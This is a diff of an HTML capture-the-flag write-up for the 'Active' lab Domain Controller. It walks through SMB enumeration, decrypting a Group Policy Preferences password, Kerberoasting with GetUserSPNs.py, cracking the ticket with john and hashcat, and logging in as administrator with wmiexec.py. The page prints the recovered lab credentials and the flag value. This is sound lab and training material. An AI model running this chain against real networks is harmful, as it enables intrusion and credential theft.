@@ -552,7 +552,7 @@
 
 
 <h1 id="active">Active</h1>
-<p>This is Active Directory box, where we get to exploit a vulnerable Domain Controller.</p>
+<p>This is <em>Active Directory</em> box, where we get to exploit a vulnerable <em>Domain Controller</em>.</p>
 <h2 id="enumeration">Enumeration</h2>
 <h3 id="nmap">Nmap</h3>
 <p><strong>-T4</strong>: aggressive speed scan</p>
@@ -562,7 +562,7 @@
 <p><strong>-Pn</strong>: skip host discovery
 <div class="highlight"><pre><span></span><code>nmap -T4 -sC -sV -p- -Pn <span class="m">10</span>.10.10.100
 </code></pre></div>
-There are some interesting ports: 88, 135, 139, 445, 389
+There are some interesting ports open: 88, 135, 139, 445, 389
 <img alt="[nmap]" src="../images/active1.png" /></p>
 <h3 id="rpc">RPC</h3>
 <p>Trying to enumerate over RPC (Remote Procedure Call), but no luck there: 
@@ -584,8 +584,8 @@ Only one share with read-only access:
 <img alt="[smb]" src="../images/active4.png" />
 <div class="highlight"><pre><span></span><code>smbclient -N //10.10.10.100/Replication
 </code></pre></div>
-<img alt="[smb]" src="../images/active5.png" /></p>
-<p><img alt="[smb]" src="../images/active6.png" /></p>
+<img alt="[smb]" src="../images/active5.png" />
+<img alt="[smb]" src="../images/active6.png" /></p>
 <p>This directory looks interesting:
 <div class="highlight"><pre><span></span><code>smb: <span class="se">\a</span>ctive.htb<span class="se">\p</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\m</span>achine<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\&gt;</span> dir
 </code></pre></div>
@@ -596,7 +596,7 @@ Downloading <em>groups.xml</em> to host:
 <span class="nt">&lt;Groups</span> <span class="na">clsid=</span><span class="s">&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;</span><span class="nt">&gt;&lt;User</span> <span class="na">clsid=</span><span class="s">&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot;</span> <span class="na">name=</span><span class="s">&quot;active.htb\SVC_TGS&quot;</span> <span class="na">image=</span><span class="s">&quot;2&quot;</span> <span class="na">changed=</span><span class="s">&quot;2018-07-18 20:46:06&quot;</span> <span class="na">uid=</span><span class="s">&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;</span><span class="nt">&gt;&lt;Properties</span> <span class="na">action=</span><span class="s">&quot;U&quot;</span> <span class="na">newName=</span><span class="s">&quot;&quot;</span> <span class="na">fullName=</span><span class="s">&quot;&quot;</span> <span class="na">description=</span><span class="s">&quot;&quot;</span> <span class="na">cpassword=</span><span class="s">&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</span> <span class="na">changeLogon=</span><span class="s">&quot;0&quot;</span> <span class="na">noChange=</span><span class="s">&quot;1&quot;</span> <span class="na">neverExpires=</span><span class="s">&quot;1&quot;</span> <span class="na">acctDisabled=</span><span class="s">&quot;0&quot;</span> <span class="na">userName=</span><span class="s">&quot;active.htb\SVC_TGS&quot;</span><span class="nt">/&gt;&lt;/User&gt;</span>
 <span class="nt">&lt;/Groups&gt;</span>
 </code></pre></div>
-Since Microsoft <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">published</a> the AES private key, we can easily decrypt any <em>Group Policy Preferences</em> password:
+Since Microsoft <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">published</a> the AES private key, we can easily decrypt any <em>Group Policy Preferences</em> password using <strong>gpp-decrypt</strong>:
 <div class="highlight"><pre><span></span><code>gpp-decrypt <span class="s1">&#39;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#39;</span>
 </code></pre></div>
 <img alt="[rcp]" src="../images/active8.png" /></p>
@@ -612,9 +612,11 @@ Since Microsoft <a href="https://docs.microsoft.com/en-us/openspecs/windows_prot
 </code></pre></div>
 <img alt="[rcp]" src="../images/active10.png" /></p>
 <h3 id="smb_1">SMB</h3>
-<p><div class="highlight"><pre><span></span><code>smbclient -U <span class="s2">&quot;active.htb\SVC_TGS%GPPstillStandingStrong2k18&quot;</span> -L <span class="m">10</span>.10.10.100
+<p>Now we connect as service user, and explore other directories we couldn't access before:
+<div class="highlight"><pre><span></span><code>smbclient -U <span class="s2">&quot;active.htb\SVC_TGS%GPPstillStandingStrong2k18&quot;</span> -L <span class="m">10</span>.10.10.100
 </code></pre></div>
-<img alt="[rcp]" src="../images/active11.png" />
+<img alt="[rcp]" src="../images/active11.png" /></p>
+<p>Using <strong>smbmap</strong> we get more information about permissions:
 <div class="highlight"><pre><span></span><code>smbmap -H <span class="m">10</span>.10.10.100 -u SVC_TGS -p <span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span>
 </code></pre></div>
 <img alt="[rcp]" src="../images/active12.png" /></p>
@@ -623,7 +625,7 @@ Since Microsoft <a href="https://docs.microsoft.com/en-us/openspecs/windows_prot
 </code></pre></div>
 <img alt="[rcp]" src="../images/active13.png" /></p>
 <h4 id="flag">Flag</h4>
-<p>We find user flag here:
+<p>And finally we get user flag:
 <div class="highlight"><pre><span></span><code>smb: \SVC_TGS\Desktop\&gt; get user.txt
 getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
 
@@ -631,27 +633,29 @@ getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec
 </code></pre></div></p>
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <h3 id="kerberoasting">Kerberoasting</h3>
+<p>Since this is <em>Active Directory</em> setup with <strong>Kerberos</strong> as authentication protocol, we can try to abuse it. There is a known technique called <strong>Kerberoast</strong>, which is actually a series of different attacks. We could use compromised service account (any user account can request tickets) that has a valid <em>Ticket-Granting Ticket</em> (TGT), and request more tickets from <em>Ticket-Granting Service</em> (TGS), for any <em>Service Principal Name</em> (SPN) on <em>Domain Controller</em>. Following figure describes how this protocol works:</p>
 <p><img alt="[rcp]" src="../images/active14.png" /></p>
-<p>We're able to get Kerberos ticket from administrator user.
+<p>If we could get TGS ticket, it could be cracked offline. We're going to request an administrator account TGS ticket. This <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">script</a> is used to find SPNs that are associated with a given user account:
 <div class="highlight"><pre><span></span><code>GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip <span class="m">10</span>.10.10.100 -request
 </code></pre></div>
 <img alt="[rcp]" src="../images/active15.png" /></p>
-<p>Cracking password with John the Ripper:
+<p>Now we have TGS hash from administrator account. Hash is already in <em>JohnTheRipper/Hashcat</em> format, we can just copy/paste it to another file, save it, and try to crack it using dictonary attack:
 <div class="highlight"><pre><span></span><code>john --wordlist<span class="o">=</span>rockyou.txt ticket
 </code></pre></div>
 <img alt="[rcp]" src="../images/active16.png" /></p>
-<p>We can also use hashcat:
+<p>We can use the same procedure with <em>Hashcat</em>:
 <div class="highlight"><pre><span></span><code>hashcat.exe -m 13100 -a 0 ticket.txt rockyou.txt --force -O
 </code></pre></div>
 <img alt="[rcp]" src="../images/active17.png" /></p>
-<p>Now we can connect as administrator.
+<p>Now that we have cracked administrator password, we can connect to server remotely:
 <div class="highlight"><pre><span></span><code>wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
 </code></pre></div>
 <img alt="[rcp]" src="../images/active18.png" /></p>
 <h4 id="flag_1">Flag</h4>
+<p>And we got administrator flag:
 <div class="highlight"><pre><span></span><code>C:\users\administrator\desktop&gt;type root.txt
 15295e8aca408c4ff3cb8adb9195ea49
-</code></pre></div>
+</code></pre></div></p>
 
 
 
